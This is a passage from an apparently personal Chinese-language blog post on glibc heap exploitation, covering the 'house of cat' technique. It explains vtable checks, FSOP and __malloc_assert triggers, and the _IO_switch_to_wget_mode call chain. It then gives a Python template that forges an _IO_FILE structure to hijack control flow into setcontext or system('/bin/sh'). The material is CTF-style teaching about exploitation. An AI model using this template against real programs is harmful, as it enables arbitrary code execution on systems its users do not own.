<h4 id="vtable检查"><a href="#vtable检查" class="headerlink" title="vtable检查"></a>vtable检查</h4><p>在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr -(<span class="type">uintptr_t</span>)__start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort。</p>
<p>虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，<strong>可以修改vtable指针为虚表段内的任意位置</strong>，也就是对于某一个<strong>_IO_xxx_jumps</strong>的任意偏移，使得其调用攻击者想要调用的IO函数。</p>
<h4 id="malloc-assert与FSOP"><a href="#malloc-assert与FSOP" class="headerlink" title="__malloc_assert与FSOP"></a>__malloc_assert与FSOP</h4><p>在glibc中存在一个函数_malloc_assert，其中会根据vtable表如_IO_xxx_jumps调用IO等相关函数；</p>
<p><strong>该函数最终会根据<code>stderr</code>这个IO结构体进行相关的IO操作</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">         <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">             __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             file, line,</span><br><span class="line">             function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">             assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>house of kiwi提供了一种调用该函数的思路，可以通过修改topchunk的大小触发，即满足下列条件中的一个</p>
<blockquote>
<p>1.topchunk的大小小于MINSIZE(0X20)<br>2.prev inuse位为0<br>3.old_top页未对齐</p>
</blockquote>
<hr>
<p>下面介绍另一种触发house of cat的方式FSOP</p>
<p>程序中所有的_IO_FILE 结构用_chain连接形成一个单链表，链表的头部则是_IO_list_all</p>
<p>FSOP就是通过劫持_IO_list_all的值（如large bin attack修改）来执行<code>_IO_flush_all_lockp</code>函数，这个函数会根据_IO_list_all刷新链表中的所有文件流，</p>
<p>在libc中代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>其中会调用vtable中的IO函数_IO_OVERFLOW，根据上面所说的虚表偏移可变思想，这个地方的虚表偏移也是可修改的，然后配合伪造IO结构体可以执行house of cat的调用链</strong></p>
<p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），</p>
<p><strong>第三种情况在高版本中已经删除</strong>;</p>
<p>__malloc_assert则是在malloc中触发，通常是修改top chunk的大小。</p>
<h4 id="一种可行的IO调用链"><a href="#一种可行的IO调用链" class="headerlink" title="一种可行的IO调用链"></a>一种可行的IO调用链</h4><p>在_IO_wfile_jumps结构体中，会根据虚表进行相关的函数调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中_IO_wfile_seekoff函数代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中fp结构体是我们可以伪造的，可以控制fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base来调用_IO_switch_to_wget_mode这个函数，继续跟进代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而_IO_WOVERFLOW是glibc里定义的一个宏调用函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1)</span></span><br></pre></td></tr></table></figure>
<p>对_IO_WOVERFLOW没有进行任何检测，为了便于理解，我们再来看看汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">► 0x7f4cae745d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7f4cae745d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7f4cae745d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7f4cae745d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7f4cae745d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7f4cae745d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7f4cae745d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                &lt;_IO_switch_to_wget_mode+56&gt;</span><br><span class="line"> </span><br><span class="line">  0x7f4cae745d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7f4cae745d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7f4cae745d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
<p>主要关注这几句，做了一下几点事情</p>
<ol>
<li><p>将[rdi+0xa0]处的内容赋值给rax，为了避免与下面的rax混淆，称之为<strong>rax1</strong>。</p>
</li>
<li><p>将新赋值的[rax1+0x20]处的内容赋值给rdx。</p>
</li>
<li>将[rax1+0xe0]处的内容赋值给rax，称之为<strong>rax2</strong>。</li>
<li>call调用[rax2+0x18]处的内容。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7f4cae745d34` `&lt;_IO_switch_to_wget_mode``+``4``&gt;   mov  rax, qword ptr [rdi ``+` `0xa0``]</span><br><span class="line">0x7f4cae745d3f` `&lt;_IO_switch_to_wget_mode``+``15``&gt;  mov  rdx, qword ptr [rax ``+` `0x20``]</span><br><span class="line">0x7f4cae745d49` `&lt;_IO_switch_to_wget_mode``+``25``&gt;  mov  rax, qword ptr [rax ``+` `0xe0``]</span><br><span class="line">0x7f4cae745d55` `&lt;_IO_switch_to_wget_mode``+``37``&gt;  call  qword ptr [rax ``+` `0x18``]</span><br></pre></td></tr></table></figure>
<p>而rdi此时的状态:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_STBECKY3R8W9W2A.png" alt=""></p>
<p>可以看到这是一个堆地址，而实际上此时rdi就是伪造的IO结构体的地址，也是可控的。</p>
<p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，</p>
<p>在<strong>开启沙箱</strong>的情况下，假如把最后调用的<strong>[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag</strong>；</p>
<p>如果<strong>未开启沙箱</strong>，则只需把<strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入/bin/sh字符串</strong>，就可执行system(“/bin/sh”)</p>
<h4 id="fake-IO结构体需要绕过的检测"><a href="#fake-IO结构体需要绕过的检测" class="headerlink" title="fake_IO结构体需要绕过的检测"></a>fake_IO结构体需要绕过的检测</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_wide_data-&gt;_IO_read_ptr ！= _wide_data-&gt;_IO_read_end</span><br><span class="line">_wide_data-&gt;_IO_write_ptr &gt; _wide_data-&gt;_IO_write_base</span><br><span class="line">#如果_wide_data=fake_io_addr+<span class="number">0x30</span>，其实也就是fp-&gt;_IO_save_base &lt; f-&gt;_IO_backup_base</span><br><span class="line">fp-&gt;_lock是一个可写地址（堆地址、libc中的可写地址）</span><br></pre></td></tr></table></figure>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>1.修改<strong>_IO_list_all</strong>为可控地址（<strong>FSOP</strong>）或修改<strong>stderr</strong>为可控地址(<strong>__malloc_assert</strong>)。<br>2.在上一步的可控地址中伪造<strong>fake_IO结构体</strong>(也可以在任意地址写的情况下修改<strong>stderr、stdout</strong>等结构体)。<br>3.通过<strong>FSOP</strong>或<strong>malloc</strong>触发攻击。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/959842_JDJKTRK7GJUEUFR.png" alt=""></p>
<h4 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h4><p>house of cat的模板，原理参照上图。伪造IO结构体时只需修改<strong>fake_io_addr</strong>地址，<strong>_IO_save_end</strong>为想要调用的函数，<strong>_IO_backup_base</strong>为执行函数时的rdx，以及修改_flags为执行函数时的rdi;FSOP和利用__malloc_assert触发house of cat的情况不同，</p>
<p>需要具体问题具体调整（FSOP需将vtable改为IO_wfile_jumps+0x30）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         <span class="comment">#_flags=rdi</span></span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)<span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE +=p64(call_addr)<span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)<span class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>
<h1 id="house-of-apple1"><a href="#house-of-apple1" class="headerlink" title="house of apple1"></a>house of apple1</h1><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><h1 id="house-of-apple3"><a href="#house-of-apple3" class="headerlink" title="house of apple3"></a>house of apple3</h1><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1></article><div class="post-copyright"><div class="post-copyright__title"><span class="post-copyright-info"><h>how2heap</h></span></div><div class="post-copyright__type"><span class="post-copyright-info"><a href="https://ixout.github.io/posts/49295/">https://ixout.github.io/posts/49295/</a></span></div><div class="post-copyright-m"><div class="post-copyright-m-info"><div class="post-copyright-a"><h>作者</h><div class="post-copyright-cc-info"><h>ixout</h></div></div><div class="post-copyright-c"><h>发布于</h><div class="post-copyright-cc-info"><h>2023-08-19</h></div></div><div class="post-copyright-u"><h>更新于</h><div class="post-copyright-cc-info"><h>2023-11-04</h></div></div><div class="post-copyright-c"><h>许可协议</h><div class="post-copyright-cc-info"><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></div></div></div></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/how2heap/">how2heap</a><a class="post-meta__tags" href="/tags/heap/">heap</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/14246/" title="calloc函数学习"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">calloc函数学习</div></div></a></div><div class="next-post pull-right"><a href="/posts/65020/" title="汇编小记"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/cover2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">汇编小记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="iconfont icon-github1"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">37</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">45</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">4</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-einherjar"><span class="toc-number">1.</span> <span class="toc-text">house of einherjar</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81"><span class="toc-number">1.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-29%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">2.29新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-force"><span class="toc-number">2.</span> <span class="toc-text">house of force</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%A6%81-1"><span class="toc-number">2.1.</span> <span class="toc-text">概要</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B1"><span class="toc-number">2.2.1.</span> <span class="toc-text">示例1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B2"><span class="toc-number">2.2.2.</span> <span class="toc-text">示例2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-31%E6%96%B0%E9%99%90%E5%88%B6"><span class="toc-number">2.3.</span> <span class="toc-text">2.31新限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981-bamboobox"><span class="toc-number">2.4.</span> <span class="toc-text">例题1-bamboobox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982-bcloud"><span class="toc-number">2.5.</span> <span class="toc-text">例题2-bcloud</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-lore"><span class="toc-number">3.</span> <span class="toc-text">house of lore</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-orange"><span class="toc-number">4.</span> <span class="toc-text">house of orange</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-rabbit"><span class="toc-number">5.</span> <span class="toc-text">house of rabbit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-roman"><span class="toc-number">6.</span> <span class="toc-text">house of roman</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-pig"><span class="toc-number">7.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">8.</span> <span class="toc-text">house of spirit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">9.</span> <span class="toc-text">house of kiwi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-banana"><span class="toc-number">10.</span> <span class="toc-text">house of banana</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-storm"><span class="toc-number">11.</span> <span class="toc-text">house of storm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B"><span class="toc-number">11.0.1.</span> <span class="toc-text">例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-emma"><span class="toc-number">12.</span> <span class="toc-text">house of emma</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">12.0.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">12.0.2.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 